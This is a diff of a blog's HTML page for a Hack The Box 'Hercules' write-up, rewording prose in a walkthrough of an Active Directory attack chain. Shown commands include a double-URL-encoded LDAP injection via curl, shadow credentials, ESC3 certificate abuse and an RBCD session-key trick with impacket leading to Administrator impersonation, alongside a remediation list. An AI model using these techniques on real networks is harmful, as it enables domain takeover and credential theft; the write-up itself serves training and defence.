@@ -4,11 +4,11 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>HTB Hercules · Will DeDominico</title>
-<meta name="description" content="NTLM-disabled Kerberos-only DC. LDAP blind injection via double URL-encoding extracts johnathan.j&#x27;s description — a live password. Spray into ken.w, coerce + crack to natalie.a, Shadow-Creds across bob.w → move Auditor between OUs → Shadow-Creds auditor. Forest Migration OU GenericAll + ESC3 Enrollment Agent → ashley.b → a scheduled aCleanup.ps1 reflows ACL inheritance, activating IIS_Administrator. Final step is Tiraniddo RBCD on IIS_WEBSERVER$ (a user account, no SPNs) — swap NT hash for the TGT session key, run S4U2Self+U2U+S4U2Proxy, impersonate Administrator.">
+<meta name="description" content="NTLM-disabled Kerberos-only DC. LDAP blind injection via double URL-encoding extracts johnathan.j&#x27;s description, which contains a live password. Spray into ken.w, coerce + crack to natalie.a, Shadow-Creds across bob.w → move Auditor between OUs → Shadow-Creds auditor. Forest Migration OU GenericAll + ESC3 Enrollment Agent → ashley.b → a scheduled aCleanup.ps1 reflows ACL inheritance, activating IIS_Administrator. Final step is Tiraniddo RBCD on IIS_WEBSERVER$ (a user account, no SPNs). Swap its NT hash for the TGT session key, run S4U2Self+U2U+S4U2Proxy, impersonate Administrator.">
 <link rel="canonical" href="https://blog.divineintellect.cc/posts/htb-hercules-writeup.html">
 <meta property="og:type" content="website">
 <meta property="og:title" content="HTB Hercules · Will DeDominico">
-<meta property="og:description" content="NTLM-disabled Kerberos-only DC. LDAP blind injection via double URL-encoding extracts johnathan.j&#x27;s description — a live password. Spray into ken.w, coerce + crack to natalie.a, Shadow-Creds across bob.w → move Auditor between OUs → Shadow-Creds auditor. Forest Migration OU GenericAll + ESC3 Enrollment Agent → ashley.b → a scheduled aCleanup.ps1 reflows ACL inheritance, activating IIS_Administrator. Final step is Tiraniddo RBCD on IIS_WEBSERVER$ (a user account, no SPNs) — swap NT hash for the TGT session key, run S4U2Self+U2U+S4U2Proxy, impersonate Administrator.">
+<meta property="og:description" content="NTLM-disabled Kerberos-only DC. LDAP blind injection via double URL-encoding extracts johnathan.j&#x27;s description, which contains a live password. Spray into ken.w, coerce + crack to natalie.a, Shadow-Creds across bob.w → move Auditor between OUs → Shadow-Creds auditor. Forest Migration OU GenericAll + ESC3 Enrollment Agent → ashley.b → a scheduled aCleanup.ps1 reflows ACL inheritance, activating IIS_Administrator. Final step is Tiraniddo RBCD on IIS_WEBSERVER$ (a user account, no SPNs). Swap its NT hash for the TGT session key, run S4U2Self+U2U+S4U2Proxy, impersonate Administrator.">
 <meta property="og:url" content="https://blog.divineintellect.cc/posts/htb-hercules-writeup.html">
 <meta name="theme-color" content="#000000">
 <link rel="icon" href="/assets/img/blackarch.svg" type="image/svg+xml">
@@ -77,7 +77,7 @@
     <header class="art-h">
       <div>
         <h1>HTB Hercules</h1>
-        <p class="lede">NTLM-disabled Kerberos-only DC. LDAP blind injection via double URL-encoding extracts <code>johnathan.j</code>&#39;s description — a live password. Spray into <code>ken.w</code>, coerce + crack to <code>natalie.a</code>, Shadow-Creds across <code>bob.w</code> → move <code>Auditor</code> between OUs → Shadow-Creds <code>auditor</code>. Forest Migration OU <code>GenericAll</code> + ESC3 Enrollment Agent → <code>ashley.b</code> → a scheduled <code>aCleanup.ps1</code> reflows ACL inheritance, activating IIS_Administrator. Final step is Tiraniddo RBCD on <code>IIS_WEBSERVER$</code> (a user account, no SPNs) — swap NT hash for the TGT session key, run <code>S4U2Self+U2U+S4U2Proxy</code>, impersonate Administrator.</p>
+        <p class="lede">NTLM-disabled Kerberos-only DC. LDAP blind injection via double URL-encoding extracts <code>johnathan.j</code>&#39;s description, which contains a live password. Spray into <code>ken.w</code>, coerce + crack to <code>natalie.a</code>, Shadow-Creds across <code>bob.w</code> → move <code>Auditor</code> between OUs → Shadow-Creds <code>auditor</code>. Forest Migration OU <code>GenericAll</code> + ESC3 Enrollment Agent → <code>ashley.b</code> → a scheduled <code>aCleanup.ps1</code> reflows ACL inheritance, activating IIS_Administrator. Final step is Tiraniddo RBCD on <code>IIS_WEBSERVER$</code> (a user account, no SPNs). Swap its NT hash for the TGT session key, run <code>S4U2Self+U2U+S4U2Proxy</code>, impersonate Administrator.</p>
       </div>
       <img class="art-av" src="/assets/img/writeups/avatars/htb-hercules.png" alt="" width="72" height="72">
     </header>
@@ -87,7 +87,7 @@
 <section class="wp-stage" id="ldapi" data-stage="1">
 <div class="wp-stage-lbl">Stage 1 &middot; LDAPi</div>
 <h2 class="wp-stage-title">Double URL-encode past the regex blacklist.</h2>
-<div class="wp-stage-body"><p>The <code>/Login</code> SSO page rejects <code>*</code>, <code>(</code>, <code>)</code>, <code>|</code>, <code>&amp;</code>, <code>=</code>, <code>\</code>, <code>&lt;</code>, <code>&gt;</code>. But <code>%</code> is allowed — and IIS cheerfully URL-decodes <span class="hl-warn">twice</span>. <code>%252A</code> slips through the regex, arrives at the app as <code>%2A</code>, decodes to <code>*</code>:</p>
+<div class="wp-stage-body"><p>The <code>/Login</code> SSO page rejects <code>*</code>, <code>(</code>, <code>)</code>, <code>|</code>, <code>&amp;</code>, <code>=</code>, <code>\</code>, <code>&lt;</code>, <code>&gt;</code>. But <code>%</code> is allowed, and IIS URL-decodes <span class="hl-warn">twice</span>. <code>%252A</code> slips through the regex, arrives at the app as <code>%2A</code>, decodes to <code>*</code>:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ curl -sk <span class="hljs-string">&#x27;https://hercules.htb/Login&#x27;</span> \
@@ -120,7 +120,7 @@ Invalid login attempt.</code></pre>
 </div>
 
 
-<p>Only NTLM-disabled Kerberos, so every subsequent tool needs <code>-k</code>. From ken.w, coerce authentication and crack the captured NetNTLMv2 — <code>natalie.a:[REDACTED]</code>.</p>
+<p>NTLM is disabled, so subsequent tools need Kerberos with <code>-k</code>. From ken.w, coerce authentication and crack the captured NetNTLMv2 to get <code>natalie.a:[REDACTED]</code>.</p>
 </div>
 </section>
 
@@ -140,7 +140,7 @@ Invalid login attempt.</code></pre>
 </div>
 
 
-<p>bob.w has <code>WRITE</code> on Security + Web Department OUs. Drag <code>Auditor</code> across the fence:</p>
+<p>bob.w has <code>WRITE</code> on the Security and Web Department OUs. Move <code>Auditor</code>:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · ldap3 · move OU</span></div>
 <pre class="wp-term-body"><code class="hljs language-python">conn.modify_dn(
@@ -201,7 +201,7 @@ $ certipy-ad auth -pfx ashley.b.pfx -dc-ip <span class="hljs-variable">$IP</span
 <section class="wp-stage" id="cleanup" data-stage="5">
 <div class="wp-stage-lbl">Stage 5 &middot; Cleanup</div>
 <h2 class="wp-stage-title">aCleanup.ps1 fires the ACL reflow → IIS_Administrator live.</h2>
-<div class="wp-stage-body"><p>ashley.b has a scheduled <code>aCleanup.ps1</code> on her desktop that triggers <code>Password Cleanup</code> — clears <code>adminCount</code> and <span class="hl-warn">re-enables ACL inheritance</span> across flagged admin objects. After that sweep, IT Support&#39;s <code>GenericAll</code> on the Forest Migration OU cascades down to <code>IIS_Administrator</code>:</p>
+<div class="wp-stage-body"><p>ashley.b has a scheduled <code>aCleanup.ps1</code> on her desktop that triggers <code>Password Cleanup</code>. It clears <code>adminCount</code> and <span class="hl-warn">re-enables ACL inheritance</span> across flagged admin objects. After that sweep, IT Support&#39;s <code>GenericAll</code> on the Forest Migration OU cascades down to <code>IIS_Administrator</code>:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · ashley.b@hercules</span></div>
 <pre class="wp-term-body"><code class="hljs language-powershell"><span class="hljs-built_in">PS</span> C:\Users\ashley.b\Desktop&gt; .\aCleanup.ps1
@@ -219,7 +219,7 @@ $ certipy-ad auth -pfx ashley.b.pfx -dc-ip <span class="hljs-variable">$IP</span
 <section class="wp-stage" id="root" data-stage="6">
 <div class="wp-stage-lbl">Stage 6 &middot; Root</div>
 <h2 class="wp-stage-title">Tiraniddo RBCD — session-key swap on a non-computer account.</h2>
-<div class="wp-stage-body"><p><code>IIS_WEBSERVER$</code> is a <span class="hl-red">user</span> (not a computer), has no SPNs, and lacks <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>. Standard RBCD <code>S4U2Proxy</code> fails. The Tiraniddo trick: request a TGT for the account, yank its session key, then <span class="hl-warn">set the account&#39;s NT hash to equal that session key</span>. Now <code>S4U2Self+U2U+S4U2Proxy</code> succeeds.</p>
+<div class="wp-stage-body"><p><code>IIS_WEBSERVER$</code> is a <span class="hl-red">user</span> (not a computer), has no SPNs, and lacks <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>. Standard RBCD <code>S4U2Proxy</code> fails. Using the Tiraniddo technique, request a TGT for the account, extract its session key, then <span class="hl-warn">set the account&#39;s NT hash to equal that session key</span>. Now <code>S4U2Self+U2U+S4U2Proxy</code> succeeds.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · impacket · Tiraniddo</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ bloodyAD ... <span class="hljs-built_in">set</span> password <span class="hljs-string">&#x27;IIS_webserver$&#x27;</span> <span class="hljs-string">&#x27;[REDACTED]&#x27;</span>
@@ -251,7 +251,7 @@ $ wmiexec.py -k -no-pass hercules.htb/Administrator@dc.hercules.htb \
 
 
 
-<aside class="wp-opsec"><div class="wp-opsec-head">OPSEC note</div><div class="wp-opsec-body"><p>Six separate ACL or Kerberos weaknesses, each ordinary on its own — LDAP input reflection, password in description, Shadow Creds, OU move, ESC3, inheritance reflow, and finally a user-account RBCD. None are unusual in isolation. What makes Hercules insane is the scheduling: you need the cleanup script to run before IIS_Administrator&#39;s inheritance propagates, and the Tiraniddo session-key swap must precede any TGS request — if the TGT rolls you start over.</p>
+<aside class="wp-opsec"><div class="wp-opsec-head">OPSEC note</div><div class="wp-opsec-body"><p>Timing matters here. The cleanup script must run before IIS_Administrator&#39;s inheritance propagates. The Tiraniddo session-key swap must also happen before any TGS request; if the TGT rolls, start over.</p>
 </div></aside></div>
 </section>
 
@@ -270,7 +270,7 @@ $ wmiexec.py -k -no-pass hercules.htb/Administrator@dc.hercules.htb \
         <ol class="kc"><li><a href="#ldapi"><span class="n">1</span><span><span class="s">LDAPi</span><span class="sub">double URL-encode %252A</span></span></a></li><li><a href="#spray"><span class="n">2</span><span><span class="s">Spray</span><span class="sub">description → ken.w</span></span></a></li><li><a href="#shadow"><span class="n">3</span><span><span class="s">Shadow</span><span class="sub">natalie.a → bob.w → auditor</span></span></a></li><li><a href="#esc3"><span class="n">4</span><span><span class="s">Esc3</span><span class="sub">fernando.r agent → ashley.b</span></span></a></li><li><a href="#cleanup"><span class="n">5</span><span><span class="s">Cleanup</span><span class="sub">aCleanup.ps1 → IIS_Administrator</span></span></a></li><li class="goal"><a href="#root"><span class="n">6</span><span><span class="s">Root</span><span class="sub">Tiraniddo RBCD + U2U</span></span></a></li></ol>
       </section>
       <section class="rc"><h3>Loadout</h3><dl class="lo"><dt>nmap</dt><dd>recon</dd><dt>curl</dt><dd>ldapi</dd><dt>netexec</dt><dd>spray</dd><dt>certipy-ad</dt><dd>shadow + esc3</dd><dt>bloodyAD</dt><dd>ace-flip</dd><dt>impacket</dt><dd>kerberos</dd><dt>evil-winrm</dt><dd>shell</dd></dl></section>
-      <section class="rc"><h3>Remediation</h3><ul class="rem"><li>Never echo LDAP search oracles to clients — a single bit of reflection is an exfil channel</li><li>Validate LDAP input server-side; regex blacklists are broken by double URL-encoding under IIS</li><li>Scope <code>GenericWrite</code> and <code>WriteAccountRestrictions</code> ACEs tightly; Shadow Credentials need only <code>msDS-KeyCredentialLink</code></li><li>Disable ESC3 template enrollment for non-trusted issuance accounts</li><li>Audit ACL inheritance flips triggered by scheduled tasks</li><li>Enforce <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> and SPN requirements on RBCD-eligible accounts</li></ul></section>
+      <section class="rc"><h3>Remediation</h3><ul class="rem"><li>Never echo LDAP search oracles to clients; a single bit of reflection is an exfil channel</li><li>Validate LDAP input server-side; regex blacklists are broken by double URL-encoding under IIS</li><li>Scope <code>GenericWrite</code> and <code>WriteAccountRestrictions</code> ACEs tightly; Shadow Credentials need only <code>msDS-KeyCredentialLink</code></li><li>Disable ESC3 template enrollment for non-trusted issuance accounts</li><li>Audit ACL inheritance flips triggered by scheduled tasks</li><li>Enforce <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> and SPN requirements on RBCD-eligible accounts</li></ul></section>
     </div>
   </details>
 </div>
